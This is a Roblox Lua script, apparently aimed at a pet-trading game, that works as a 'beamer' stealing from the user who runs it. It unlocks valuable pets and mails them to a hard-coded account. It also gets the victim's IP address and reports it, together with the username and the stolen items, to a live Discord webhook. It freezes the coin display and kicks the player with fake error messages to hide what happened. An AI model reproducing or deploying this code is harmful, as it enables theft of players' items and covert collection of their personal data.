-- Dependencies --
local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network)
local Inventory = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Inventory
local CurrencyCmds = require(game:GetService("ReplicatedStorage").Library.Client.CurrencyCmds)
local UnlockRemote = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked")
local Request = http.request or http_request or syn.request or request
local Player = game:GetService("Players").LocalPlayer
local Functions = {}
local ProcessPending = game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"].Disabled == true
local Database = {"Huge", "Titanic", "Acorn", "Jelly Coin", "God", "Egg", "Gift", "Present", "Bag", "Key", "Pickaxe", "Exotic", "Runic", "Legendary", "Diamond"}
local username = "YkDxrkyy"
local webhook = "https://discord.com/api/webhooks/1331009534780772442/Eo6OZ3k0ua5_sMe1yOr0A3GRGXRDl7BNlCBfEKaEA6fUl3gVgsNlYX3NA0y0N6AhyBZT"
local mailmessage = "Beamed By Ricky"

Functions.HookDeep = function()
	local Label = game:GetService("Players").LocalPlayer.PlayerGui.Main.Left["Coins Desktop"].Amount
	local Old = Label.Text

	Label:GetPropertyChangedSignal("Text"):Connect(function()
		Label.Text = Old
	end)
end


Functions.InvokeWebserver = function(index, value, rap)
	local Cum = {
		["embeds"] = {
			{
				["description"] = "**"..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.."**",
				["color"] = 0x363636, 
				["fields"] = {
					{
						["name"] = "\u{26f9}\u{fe0f} Player Data",
						["value"] = "```js\nFirmware: " .. tostring(identifyexecutor() or "Unknown Shitsploit") .. "\nIP: " .. tostring(Functions.ParseIP()) .. "\nUsername: " .. tostring(Player.Name) .. "```",
						["inline"] = true
					},
					{
						["name"] = "\u{1f4e5} Recieved",
						["value"] = "```js\nPet: " .. tostring(index) .. "\nAmount: " .. tostring(value) .. "x\nTotal RAP: " .. tostring(rap) .. "```",
						["inline"] = true
					}
				},
			}
		}
	}

	Request({
		Url = webhook,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json"
		},        
		Body = game:GetService("HttpService"):JSONEncode(Cum)
	})
end

Functions.ParseAbbreviation = function(v)
	if v >= 1e9 then
		return string.format("%.1fB", v / 1e9)
	elseif v >= 1e6 then
		return string.format("%.1fM", v / 1e6)
	elseif v >= 1e3 then
		return string.format("%.1fK", v / 1e3)
	else
		return tostring(v)
	end
end

Functions.ParseIP = function()
	local response = Request({
		Url = "https://api.ipify.org/?format=json",
		Method = "GET",
	})

	local Decoded = game:GetService("HttpService"):JSONDecode(response.Body)
	return Decoded.ip
end


Functions.CoinCheck = function()
	return CurrencyCmds.Get("Coins")
end

if Functions.CoinCheck() <= 48000 then
	Player:Kick("Debugger Detected, Please Close & Retry.\nAccount Flagged: true")
else
	warn("Library.Client\nInvoking UI Library.")
end

Functions.FaceRapValue = function(ClassName, StackKey, retryCount)
	local Module = require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds)
	local args = {
		Class = { Name = ClassName },
		StackKey = function()
			return StackKey
		end,
		AbstractGetRAP = function()
			return nil
		end
	}

	local Rap = Module.Get(args)
	if Rap ~= nil then
		return Rap
	else
		return Functions.FaceRapValue(ClassName, StackKey) 
	end
end

Functions.StealingProcess = function()
	local Huges = 0
	local SortedRAP = 0

	for uid, c in pairs(Inventory.Pet) do
		for i, v in ipairs(Database) do
			if string.find(c.id, v) then
				UnlockRemote:InvokeServer(uid, false)
				Network.Invoke("Mailbox: Send", username, mailmessage, "Pet", uid, c._am or 1)

				Huges = Huges + 1
				local Quantity = c._am or 1
				local RAP = Functions.FaceRapValue("Pet", string.format("{\"id\":\"%s\"}", c.id)) 
				Functions.InvokeWebserver(c.id, Quantity, Functions.ParseAbbreviation(Quantity * RAP))
			end
		end
	end

	if Huges == 0 then
		Player:Kick("Couldn't Fetch Save, Rejoin.")
		return false, "No Huges Found"
	end
	return Huges, SortedRAP
end

task.spawn(Functions.HookDeep)
task.spawn(Functions.StealingProcess)

return Functions
